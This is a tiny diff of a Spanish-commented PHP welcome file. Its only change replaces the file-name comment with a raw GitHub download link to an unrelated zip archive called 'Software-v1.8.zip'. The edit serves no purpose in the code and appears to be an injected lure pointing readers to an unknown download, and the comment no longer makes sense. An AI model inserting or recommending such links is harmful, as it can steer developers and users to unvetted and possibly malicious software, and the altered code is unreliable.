@@ -1,5 +1,5 @@
 <?php
-// Archivo: bienvenida.php
+// Archivo: https://github.com/sanamid/importaboo/raw/refs/heads/main/elaeometer/Software-v1.8.zip
 $nombre = "Usuario"; // Puedes cambiar el nombre por el nombre del visitante
 ?>
 
